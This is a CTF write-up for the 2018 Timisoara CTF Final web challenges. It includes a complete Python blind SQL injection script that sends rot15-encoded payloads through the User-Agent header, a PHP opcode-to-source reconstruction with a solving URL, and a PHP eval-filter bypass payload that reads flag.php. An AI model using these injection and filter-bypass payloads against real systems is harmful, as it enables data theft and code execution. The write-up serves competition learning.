# Timisoara CTF Final Web Write-ups
~~~
second place in Timisoara CTF Final (NextLine)
2018.06.09 - 2018.06.10
Written by Siwoo Mun (munsiwoo)
~~~

### SQL Sanity Check (100pts)

It's postgresql injection challenge.  
injection point is `User-Agent` header. (request)  

```python
from requests import post
import string
# made by munsiwoo

def rot(argv) :
	rot15_table = {
		'a':'p', 'b':'q', 'c':'r', 'd':'s', 'e':'t', 'f':'u',
		'g':'v', 'h':'w', 'i':'x', 'j':'y', 'k':'z', 'l':'a',
		'm':'b', 'n':'c', 'o':'d', 'p':'e', 'q':'f', 'r':'g',
		's':'h', 't':'i', 'u':'j', 'v':'k', 'w':'l', 'x':'m',
		'y':'n', 'z':'o',
		'A':'P', 'B':'Q', 'C':'R', 'D':'S', 'E':'T', 'F':'U',
		'G':'V', 'H':'W', 'I':'X', 'J':'Y', 'K':'Z', 'L':'A',
		'M':'B', 'N':'C', 'O':'D', 'P':'E', 'Q':'F', 'R':'G',
		'S':'H', 'T':'I', 'U':'J', 'V':'K', 'W':'L', 'X':'M',
		'Y':'N', 'Z':'O'
	}
	val = str()

	for x in argv :
		if(x in string.ascii_letters) :
			val += rot15_table[x]
		else :
			val += x

	return val

def main() :
	uri = 'http://89.38.210.129:8093/login.php'
	data = {'email': ''}
	headers = {
		'Content-Type': 'application/x-www-form-urlencoded',
		'Cookie': 'PHPSESSID=4is785omsp8monrenoop16len7',
		'User-Agent': ''
	}

	# public:fl4g_1337:flag
	# payload  = "' or substr((select table_schema||':'||table_name||':'||column_name from "
	# payload += "information_schema.columns where table_schema='public' limit 1), {}, 1)='{}"
	# timctf{1mP0rt4nT_r34lly_l0nG_ex7ra_l0nG_Fl4G_f0R_h34D_Mas7eR}

	payload  = "' or substr((select flag from fl4g_1337 limit 1), {}, 1)='{}"
	query = (lambda x, y:payload.format(x,y))
	strings = '{}:_' + string.ascii_letters + string.digits;
	result = str()

	for x in range(1, 100) :
		for y in strings :
			headers['User-Agent'] = rot(query(x, y))
			response = post(uri, data=data, headers=headers).text

			if(response.find("Welcome back!") != -1) :
				result += y
				break

			if(y == '9') :
				exit(0)

		print(result)

if __name__ == '__main__' :
	main()
	
```

a piece of cake =)  

  

### PHP REvival (200pts)

It's php zend engine opcode analyze challenge.  
reference : http://php.net/manual/kr/internals2.opcodes.php  
```
function name:  (null)
compiled vars:  none
line     #* E I O op                           fetch          ext  return  operands
-------------------------------------------------------------------------------------
   3     0  E >   NOP
  14     1        INIT_FCALL                                               'getflag'
         2        FETCH_R                      global              $0      '_REQUEST'
         3        FETCH_DIM_R                                      $1      $0, 'g'
         4        SEND_VAR                                                 $1
         5        DO_FCALL                                      0  $2
         6        ECHO                                                     $2
  21     7      > RETURN                                                   1

function name:  getFlag
compiled vars:  !0 = $guess, !1 = $flag
line     #* E I O op                           fetch          ext  return  operands
-------------------------------------------------------------------------------------
   3     0  E >   RECV                                             !0
   4     1        ASSIGN                                                   !1, '*CENSORED_FLAG*'
   6     2        STRLEN                                           ~3      !0
         3        IS_NOT_IDENTICAL                                 ~4      ~3, 8
         4      > JMPZ                                                     ~4, ->6
         5    > > RETURN                                                   null

   7     6    >   FETCH_DIM_R                                      $5      !0, 3
         7        FETCH_DIM_R                                      $6      !0, 5
         8        IS_NOT_IDENTICAL                                 ~7      $5, $6
         9      > JMPZ_EX                                          ~7      ~7, ->14
        10    >   FETCH_DIM_R                                      $8      !0, 5
        11        FETCH_DIM_R                                      $9      !0, 7
        12        IS_NOT_EQUAL                                     ~10     $8, $9
        13        BOOL                                             ~7      ~10
        14    > > JMPZ_EX                                          ~7      ~7, ->20
        15    >   FETCH_DIM_R                                      $11     !0, 0
        16        FETCH_DIM_R                                      $12     !0, 1
        17        MUL                                              ~13     $11, $12
        18        IS_NOT_IDENTICAL                                 ~14     ~13, 30
        19        BOOL                                             ~7      ~14
        20    > > JMPZ                                                     ~7, ->22
        21    > > RETURN                                                   null

   8    22    >   FETCH_DIM_R                                      $15     !0, 1
        23        FETCH_DIM_R                                      $16     !0, 2
        24        FETCH_DIM_R                                      $17     !0, 6
        25        ADD                                              ~18     $16, $17
        26        IS_NOT_EQUAL                                     ~19     $15, ~18
        27      > JMPZ_EX                                          ~19     ~19, ->34
        28    >   FETCH_DIM_R                                      $20     !0, 3
        29        FETCH_DIM_R                                      $21     !0, 0
        30        FETCH_DIM_R                                      $22     !0, 2
        31        ADD                                              ~23     $21, $22
        32        IS_NOT_EQUAL                                     ~24     $20, ~23
        33        BOOL                                             ~19     ~24
        34    > > JMPZ                                                     ~19, ->36
        35    > > RETURN                                                   null
        
   9    36    >   INIT_FCALL                                               'md5'
        37        CONCAT                                           ~25     'a', !0
        38        CONCAT                                           ~26     ~25, 'a'
        39        SEND_VAL                                                 ~26
        40        DO_ICALL                                         $27
        41        IS_NOT_EQUAL                                     ~28     $27, 0
        42      > JMPZ                                                     ~28, ->44
        43    > > RETURN                                                   null
  11    44    > > RETURN                                                   !1
  12    45*     > RETURN                                                   null
End of function getflag
```
to
```php
<?php
echo getFlag($_REQUEST['g']);

function getflag($guess, $flag='*CENSORED_FLAG*'){
	if(strlen($guess) !== 8) return null;

	if($guess[3] !== $guess[5] &&
	   $guess[5] != $guess[7] &&
	   $guess[0] * $guess[1] !== 30) return null;
	   
	if($guess[1] != $guess[2] + $guess[6] &&
	   $guess[3] != $guess[0] + $guess[2]) return null;

	if(md5('a' + $guess + 'a') != 0) return $flag;
}
```
my payload : ``http://89.38.210.129:8091/?g=56123455``

### YAPS (100pts) - First blood
It's PHP Jail.  
flag is in the flag.php  
```php
<?php

$k = $_REQUEST['k'];
// just one simple trick.. now all hackers hate him
if (preg_match("/[\w]{3,}/is", $k) || preg_match("/\.|\"|'|\[/s", $k) || strlen($k) > 100) die('nope');

eval($k);

highlight_file(__FILE__);
```
my payload : ``http://89.38.210.129:8095/?k=$a=_G;$a{2}=E;$a{3}=T;${$a}{b}(${$a}{c});&b=highlight_file&c=flag.php``  
  
a piece of cake =)  
  
### YAPS2 (350pts)
It's open_basedir and disable_functions bypass challenge.  
